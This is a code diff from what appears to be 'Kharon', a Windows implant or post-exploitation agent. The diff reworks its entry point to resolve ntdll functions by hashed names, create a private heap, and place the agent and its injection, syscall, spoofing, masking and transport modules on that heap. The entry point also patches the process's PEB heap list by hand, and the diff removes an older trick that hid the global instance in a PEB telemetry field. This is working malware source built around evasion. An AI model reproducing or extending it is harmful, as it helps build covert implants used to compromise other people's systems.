@@ -2,54 +2,95 @@
 
 using namespace Root;
 
+inline void* operator new(size_t, void* p) { return p; }
+inline void operator delete(void*, void*) noexcept {}  
+
 EXTERN_C DECLFN auto Main(
     _In_ UPTR Argument
 ) -> VOID {
-    Kharon Kh;
+    PEB* peb = NtCurrentPeb();
 
-    Crypt     KhCrypt( &Kh );
-    Spoof     KhSpoof( &Kh );
-    Coff      KhCoff( &Kh );
-    Syscall   KhSyscall( &Kh );
-    Socket    KhSocket( &Kh );
-    Jobs      KhJobs( &Kh );
-    Useful    KhUseful( &Kh );
-    Library   KhLibrary( &Kh );
-    Token     KhToken( &Kh );
-    Heap      KhHeap( &Kh );
-    Process   KhProcess( &Kh );
-    Memory    KhMemory( &Kh );
-    Thread    KhThread( &Kh );
-    Task      KhTask( &Kh );
-    Transport KhTransport( &Kh );
-    Package   KhPackage( &Kh );
-    Parser    KhParser( &Kh );
-    Mask      KhMask( &Kh );
-    Injection khInject( &Kh );
+    auto AllocHeap = (PVOID (*)( PVOID, ULONG, SIZE_T ))LdrLoad::_Api( 
+        LdrLoad::Module( Hsh::Str<CHAR>( "ntdll.dll" ) ), 
+        Hsh::Str<CHAR>( "RtlAllocateHeap" ) 
+    );
 
-    Kh.InitInject( &khInject );
-    Kh.InitCrypt( &KhCrypt );
-    Kh.InitSpoof( &KhSpoof );
-    Kh.InitCoff( &KhCoff );
-    Kh.InitMemory( &KhMemory );
-    Kh.InitSyscall( &KhSyscall );
-    Kh.InitSocket( &KhSocket );
-    Kh.InitJobs( &KhJobs );
-    Kh.InitUseful( &KhUseful );
-    Kh.InitHeap( &KhHeap );
-    Kh.InitLibrary( &KhLibrary );
-    Kh.InitToken( &KhToken );
-    Kh.InitMask( &KhMask );
-    Kh.InitProcess( &KhProcess );
-    Kh.InitTask( &KhTask );
-    Kh.InitTransport( &KhTransport );
-    Kh.InitThread( &KhThread );
-    Kh.InitPackage( &KhPackage );
-    Kh.InitParser( &KhParser );
+    auto RtlCreateHeap = (PVOID(*)(ULONG, PVOID, SIZE_T, SIZE_T, PVOID, PVOID))LdrLoad::_Api(
+        LdrLoad::Module(Hsh::Str<CHAR>("ntdll.dll")), 
+        Hsh::Str<CHAR>("RtlCreateHeap")
+    );
+    PVOID CustomHeap = RtlCreateHeap(
+        HEAP_GROWABLE | HEAP_ZERO_MEMORY,
+        nullptr,
+        0x100000,  // 1MB
+        0,
+        nullptr,
+        nullptr
+    );
 
-    Kh.Init();
+    Kharon* Kh = (Kharon*)AllocHeap( CustomHeap, HEAP_ZERO_MEMORY, sizeof( Kharon ) ); new (Kh) Kharon();
+    
+    if (peb->NumberOfHeaps >= peb->MaximumNumberOfHeaps) {
+        ULONG newMax = peb->MaximumNumberOfHeaps * 2;
+        
+        PVOID* newHeaps = (PVOID*)AllocHeap(
+            peb->ProcessHeap, 
+            HEAP_ZERO_MEMORY, 
+            newMax * sizeof(PVOID)
+        );
 
-    Kh.Start( Argument );
+        Mem::Copy( newHeaps, peb->ProcessHeaps, peb->NumberOfHeaps * sizeof(PVOID) );
+        
+        peb->ProcessHeaps = newHeaps;
+        peb->MaximumNumberOfHeaps = newMax;
+    }
+
+    peb->ProcessHeaps[peb->NumberOfHeaps] = Kh;
+    peb->NumberOfHeaps++;
+
+    Crypt*     KhCrypt   = (Crypt*)    AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Crypt));     new (KhCrypt) Crypt(Kh);
+    Spoof*     KhSpoof   = (Spoof*)    AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Spoof));     new (KhSpoof) Spoof(Kh);
+    Coff*      KhCoff    = (Coff*)     AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Coff));      new (KhCoff) Coff(Kh);
+    Syscall*   KhSyscall = (Syscall*)  AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Syscall));   new (KhSyscall) Syscall(Kh);
+    Socket*    KhSocket  = (Socket*)   AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Socket));    new (KhSocket) Socket(Kh);
+    Jobs*      KhJobs    = (Jobs*)     AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Jobs));      new (KhJobs) Jobs(Kh);
+    Useful*    KhUseful  = (Useful*)   AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Useful));    new (KhUseful) Useful(Kh);
+    Library*   KhLibrary = (Library*)  AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Library));   new (KhLibrary) Library(Kh);
+    Token*     KhToken   = (Token*)    AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Token));     new (KhToken) Token(Kh);
+    Heap*      KhHeap    = (Heap*)     AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Heap));      new (KhHeap) Heap(Kh);
+    Process*   KhProcess = (Process*)  AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Process));   new (KhProcess) Process(Kh);
+    Memory*    KhMemory  = (Memory*)   AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Memory));    new (KhMemory) Memory(Kh);
+    Thread*    KhThread  = (Thread*)   AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Thread));    new (KhThread) Thread(Kh);
+    Task*      KhTask    = (Task*)     AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Task));      new (KhTask) Task(Kh);
+    Transport* KhTransport = (Transport*)AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Transport));new (KhTransport) Transport(Kh);
+    Package*   KhPackage = (Package*)  AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Package));   new (KhPackage) Package(Kh);
+    Parser*    KhParser  = (Parser*)   AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Parser));    new (KhParser) Parser(Kh);
+    Mask*      KhMask    = (Mask*)     AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Mask));      new (KhMask) Mask(Kh);
+    Injection* khInject  = (Injection*)AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Injection)); new (khInject) Injection(Kh);
+
+    Kh->InitInject( khInject );
+    Kh->InitCrypt( KhCrypt );
+    Kh->InitSpoof( KhSpoof );
+    Kh->InitCoff( KhCoff );
+    Kh->InitMemory( KhMemory );
+    Kh->InitSyscall( KhSyscall );
+    Kh->InitSocket( KhSocket );
+    Kh->InitJobs( KhJobs );
+    Kh->InitUseful( KhUseful );
+    Kh->InitHeap( KhHeap );
+    Kh->InitLibrary( KhLibrary );
+    Kh->InitToken( KhToken );
+    Kh->InitMask( KhMask );
+    Kh->InitProcess( KhProcess );
+    Kh->InitTask( KhTask );
+    Kh->InitTransport( KhTransport );
+    Kh->InitThread( KhThread );
+    Kh->InitPackage( KhPackage );
+    Kh->InitParser( KhParser );
+
+    Kh->Init();
+
+    Kh->Start( Argument );
 
     return;
 }
@@ -74,10 +115,6 @@ DECLFN Kharon::Kharon( VOID ) {
 auto DECLFN Kharon::Init(
     VOID
 ) -> void {
-    /* ========= [ set global kharon instance ] ========= */
-    
-    NtCurrentPeb()->TelemetryCoverageHeader = (PTELEMETRY_COVERAGE_HEADER)this;
-
     /* ========= [ init modules and funcs ] ========= */
     this->Mscoree.Handle   = LdrLoad::Module( Hsh::Str<CHAR>( "mscoree.dll" ) );
     this->Advapi32.Handle  = LdrLoad::Module( Hsh::Str<CHAR>( "advapi32.dll" ) );
